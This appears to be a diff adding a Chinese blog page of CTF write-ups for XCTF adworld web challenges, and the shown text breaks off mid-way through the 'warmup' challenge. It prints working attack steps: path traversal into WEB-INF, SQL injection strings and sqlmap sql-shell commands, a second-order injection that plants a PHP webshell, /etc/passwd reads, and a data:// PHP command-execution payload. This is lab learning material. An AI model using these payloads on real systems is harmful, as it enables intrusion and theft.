@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="攻防世界web：攻防世界 (xctf.org.cn)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界">
+<meta property="og:url" content="http://example.com/2021/07/22/web%E5%AE%89%E5%85%A8/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/index.html">
+<meta property="og:site_name" content="Sean&#39;s Blog">
+<meta property="og:description" content="攻防世界web：攻防世界 (xctf.org.cn)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918173130391.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918173403482.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918180300772.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918180703841.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918182731690.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918184214451.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918185625343.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918185827859.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918192829456.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918193009327.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918193436540.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918193804357.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918194040077.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920132151246.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920133824589.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920133943036.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920134737214.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920135702102.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920152430407.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920154208909.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920154541188.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920155130997.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920172242394.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920181153437.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920194416918.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920194546768.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920194740380.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920195020379.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922150745228.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ef9f3951c88d4a7793cef38f37605a74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VwZXJtZWF0Ym95MjIz,size_18,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922151711084.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922152344228.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922153834032.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922154643883.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922154959547.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922155047994.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922215112348.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922220054669.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922223205761.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922231951727.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922232233431.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922232830677.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923123201617.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923124059108.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923124635421.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923125040000.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923132929653.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923132350508.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923142421369.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923133035651.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230923140427255.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924195451396.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926162105926.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926170258991.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926172447403.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926172725080.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924204230277.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924204124599.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924205356049.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924205620452.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924215229101.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924215553269.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924220938714.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924221812878.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924222708295.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924223234940.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230924223728188.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926145130781.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926174132713.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230926174326671.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927211317024.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927222419314.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927223339502.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927230919793.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927231454928.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927231637462.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927232429600.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230927232815390.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928131935998.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928132154633.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928135203081.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928143304510.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928145730485.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928150651219.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928151329085.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928210231457.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928211959474.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928213933208.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928221227410.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928222909493.png">
+<meta property="article:published_time" content="2021-07-22T04:24:56.000Z">
+<meta property="article:modified_time" content="2024-05-27T07:10:01.434Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="网络安全 课程笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918173130391.png">
+
+<link rel="canonical" href="http://example.com/2021/07/22/web%E5%AE%89%E5%85%A8/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>攻防世界 | Sean's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sean's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/22/web%E5%AE%89%E5%85%A8/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banner.jpg">
+      <meta itemprop="name" content="Sean">
+      <meta itemprop="description" content="热爱可抵岁月漫长">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sean's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-22 12:24:56" itemprop="dateCreated datePublished" datetime="2021-07-22T12:24:56+08:00">2021-07-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-27 15:10:01" itemprop="dateModified" datetime="2024-05-27T15:10:01+08:00">2024-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>攻防世界web：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p>
+<span id="more"></span>
+
+<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h2><p>flag.txt:flag文件地址为&#x2F;fllllllllllllag</p>
+<p>welcome.txt:render可联想到<strong>模板注入</strong></p>
+<p>hints.txt:hash函数为md5(cookie_secret+md5(filename))</p>
+<ol>
+<li>直接访问…&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag得到Error<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918173130391.png" alt="image-20230918173130391"></li>
+<li>注入点就在msg参数，测试payload:49，ORZ可能是有过滤<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918173403482.png" alt="image-20230918173403482"></li>
+<li>获取cookie_secret, payload:·<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918180300772.png" alt="image-20230918180300772"></li>
+<li>md5(‘af48a7b1-5b2c-4a44-9f3b-b821de545130’+md5(‘&#x2F;fllllllllllllag’))&#x3D;92d5603dea43b40a2df6717dc15371b0，构造URL：…&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;92d5603dea43b40a2df6717dc15371b0<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918180703841.png" alt="image-20230918180703841"></li>
+</ol>
+<p>总结：SSTI、Tornado框架、文件包含</p>
+<h2 id="Zhuanxv"><a href="#Zhuanxv" class="headerlink" title="*Zhuanxv"></a>*Zhuanxv</h2><p>页面没有什么有效信息，考虑目录扫描。</p>
+<ol>
+<li><code>dirb [url]</code>，扫描到&#x2F;list路径<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918182731690.png" alt="image-20230918182731690"></li>
+<li>访问&#x2F;list，跳转到后台登录&#x2F;zhuanxvlogin，尝试登录，返回结果中加载背景图的方式存在文件包含漏洞<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918184214451.png" alt="image-20230918184214451"></li>
+<li>结合JSESSIONID，猜测其为MVC框架，MVC框架都有web.xml<ol>
+<li>查看<code>../../WEB-INF/web.xml</code>，确定其为struts2框架<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918185625343.png" alt="image-20230918185625343"></li>
+<li>查看<code>../../WEB-INF/classes/struts.xml</code>，找到用户登录相关的信息<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918185827859.png" alt="image-20230918185827859"></li>
+<li>加载对应包：<code>../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class</code><ol>
+<li>下载.class文件，直接用浏览器访问这个地址可以下载得到bg.jpg，修改为UserLoginAction.class</li>
+<li>使用jd-gui将class文件<strong>反编译</strong>为java文件，跟踪登录逻辑：execute-&gt;userCheck-&gt;userService.loginCheck<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918192829456.png" alt="image-20230918192829456"></li>
+<li>下载<code>../../WEB-INF/classes/com/cuitctf/service/UserService.class</code>，没有函数的具体逻辑</li>
+</ol>
+</li>
+<li>查看<code>../../WEB-INF/classes/applicationContext.xml</code>（来自于User.class），找到跟userservice有关的包：UserServiceImpl<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918193009327.png" alt="image-20230918193009327"><ol>
+<li>存在user.hbm.xml文件，暴露了flag可能在数据库中（Flag表flag列</li>
+<li>下载<code>../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class</code></li>
+<li>找到loginCheck函数，进一步追踪到UserDao<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918193436540.png" alt="image-20230918193436540"></li>
+</ol>
+</li>
+<li>下载<code>../../WEB-INF/classes/com/cuitctf/dao/UserDao.class</code>，没有具体函数，根据上一步的经验找到UserDaoImpl<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918193804357.png" alt="image-20230918193804357"><ol>
+<li>下载<code>../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class</code></li>
+<li>找到最终的登录查询语句<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230918194040077.png" alt="image-20230918194040077"></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>单引号闭合，无报错显示，盲注。<strong>sqlmap不行</strong> <ol>
+<li>UserServiceImpl.class对空格和等号有过滤，解决：用换行符(%0A)替换空格，用大于小于逻辑替换相等逻辑</li>
+<li></li>
+</ol>
+</li>
+</ol>
+<p>总结：Java框架结构、class反编译、Hibernate关联映射、SQL注入、hsql？</p>
+<h2 id="ezsqli"><a href="#ezsqli" class="headerlink" title="*ezsqli"></a>*ezsqli</h2><p>SQL语句报错回显，没有直接显示出来，被隐藏了，但是看源码可以看到。是<code>&#39;)</code>闭合</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920132151246.png" alt="image-20230920132151246"></p>
+<p>报错注入：<code>uname=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;passwd=1</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920133824589.png" alt="image-20230920133824589"></p>
+<p>查询information_schema出现问题，可能存在过滤</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920133943036.png" alt="image-20230920133943036"></p>
+<p>保存请求包到文件login.txt，使用sqlmap可以跑出来：</p>
+<ol>
+<li><code>sqlmap -r login.txt</code>，默认，可以报错注入、布尔盲注、时间盲注</li>
+<li><code>sqlmap -r login.txt --dbs</code></li>
+<li><code>sqlmap -r login.txt -D security --tables</code>，存在flag表<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920134737214.png" alt="image-20230920134737214"></li>
+<li>查询列名失败：<code>unable to retrieve column names for table &#39;flag&#39; in database &#39;security&#39; </code>。<strong>原因：无列名</strong></li>
+</ol>
+<p>burp手工报错注入结果不全：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920135702102.png" alt="image-20230920135702102"></p>
+<p>无列名注入：</p>
+<ol>
+<li>sqlmap指定布尔盲注进入–sql-shell：<code>sqlmap -r login.txt -D security -technique B --sql-shell</code></li>
+<li>进行子查询 <code>select x.1 from (select 1 union select * from flag)x;</code><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920152430407.png" alt="image-20230920152430407"></li>
+</ol>
+<p>总结：报错注入、information_schema过滤、无列名注入</p>
+<h2 id="filemanager"><a href="#filemanager" class="headerlink" title="filemanager"></a>filemanager</h2><p>delete一个位置文件爆出绝对路径：<code>/var/www/html/</code>，看起来还跟mysql有关<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920154208909.png" alt="image-20230920154208909"></p>
+<p>上传php文件报错error extension：文件后缀的问题</p>
+<p>上传图片成功，获取上传路径<code>/upload/</code><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920154541188.png" alt="image-20230920154541188"></p>
+<p>抓包修改php文件后缀为jpg：上传成功<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920155130997.png" alt="image-20230920155130997"></p>
+<p><strong>unbelievable</strong> 目录扫描(dirmap)有源码<a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a> <img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920172242394.png" alt="image-20230920172242394"></p>
+<p>源码审计</p>
+<ol>
+<li>common.inc.php对GET&#x2F;POST&#x2F;COOKIE请求的参数进行了addslashes处理（为单引号、双引号、反斜杠、NULL前面添加反斜杠进行转义）</li>
+<li>upload.php采用白名单后缀、对文件名进行addslashes处理、然后将文件名及后缀写入数据库</li>
+<li>rename.php，update操作中的oldname是从select结果中获取的，存在<strong>二次注入</strong><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920181153437.png" alt="image-20230920181153437"></li>
+</ol>
+<p>根据以上逻辑构造<code>filename=&quot;&#39;,extention=&#39;.jpg&quot;</code>(这个文件内容不重要，主要是为了构造一个extension为空的记录)，上传。</p>
+<ol>
+<li><code>update ...set filename=&#39;shell.jpg&#39;,oldname=&#39;&#39;,extension=&#39;&#39; where...</code>，数据库中的extension修改为空，此时数据库中的文件为shell.jpg，但是文件系统中的是shell.jpg.jpg<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920194416918.png" alt="image-20230920194416918"></li>
+<li>上传真正的shell，filename&#x3D;shell.jpg<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920194546768.png" alt="image-20230920194546768"></li>
+<li>rename，此时数据库中更改的第一个文件，文件系统中修改的第二个。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920194740380.png" alt="image-20230920194740380"></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>数据库中的filename</th>
+<th>数据库中的ext</th>
+<th>文件系统中的filename</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘,extention&#x3D;’.jpg</td>
+<td>.’,extention&#x3D;’</td>
+<td>.jpg</td>
+<td>‘,extention&#x3D;’.jpg</td>
+</tr>
+<tr>
+<td>‘,extention&#x3D;’.jpg rename后</td>
+<td>shell.jpg</td>
+<td>空</td>
+<td>shell.jpg.jpg</td>
+</tr>
+<tr>
+<td>shell.jpg（文件是否重复根据数据库判断，因此不重复）</td>
+<td>shell</td>
+<td>.jpg</td>
+<td>shell.jpg</td>
+</tr>
+<tr>
+<td>shell.jpg.jpg rename后（oldname为shell.jpg，newname不重要)</td>
+<td>shell</td>
+<td>空</td>
+<td>shell.jpg-&gt;shell.php</td>
+</tr>
+</tbody></table>
+<p>主打一个数据库与文件系统中的信息差</p>
+<p>蚁剑连接http:&#x2F;&#x2F;…..&#x2F;upload&#x2F;shell.php，flag在根目录下的flag.txt中<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230920195020379.png" alt="image-20230920195020379"></p>
+<p>总结：目录扫描、文件上传、二次注入</p>
+<h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><p>源码分析：</p>
+<ul>
+<li>接收hello和page参数</li>
+<li>过滤<code>php://</code>协议</li>
+<li>文件包含<code>include</code></li>
+</ul>
+<p>利用file协议查看绝对路径下的文件<code>file:///etc/passwd</code>，得到www-data（web用户）的路径<code>/var/www/</code><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922150745228.png" alt="image-20230922150745228"></p>
+<p>PHP中支持的协议：<a target="_blank" rel="noopener" href="https://blog.csdn.net/supermeatboy223/article/details/123181447">文件包含漏洞利用-CSDN博客</a><img src="https://img-blog.csdnimg.cn/ef9f3951c88d4a7793cef38f37605a74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAc3VwZXJtZWF0Ym95MjIz,size_18,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
+<p>由于过滤了php:&#x2F;&#x2F;协议，尝试data:&#x2F;&#x2F;协议实现代码执行<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922151711084.png" alt="image-20230922151711084"></p>
+<p>执行系统命令<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/109231480">PHP中常见的命令执行函数与代码执行函数_cmd&#x3D;system()_红烧兔纸的博客-CSDN博客</a></p>
+<p>tips.查看phpinfo中的disable_functions找到没被禁用的函数去尝试命令执行。eg.本题中<strong>exec函数被禁用</strong>，尝试system函数成功找到flag文件：fl4gisisish3r3.php<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922152344228.png" alt="image-20230922152344228"></p>
+<p>执行cat命令读取flag文件：<code>data://text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;); ?&gt;</code></p>
+<p><strong>没有回显是因为被注释了导致不显示！！</strong>查看页面源码可以找到，或者直接抓包。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922153834032.png" alt="image-20230922153834032"></p>
+<p>总结：php伪协议，php命令执行</p>
+<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>查看页面源码，敏感信息泄露 source.php<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922154643883.png" alt="image-20230922154643883"></p>
+<p>查看source.php获得新的提示hint.php<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922154959547.png" alt="image-20230922154959547"></p>
+<p>查看hint.php获得flag的位置提示，应该是文件名<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230922155047994.png" alt="image-20230922155047994"></p>
+<p>代码审计source.php，存在文件包含include。但是存在一些过滤：</p>
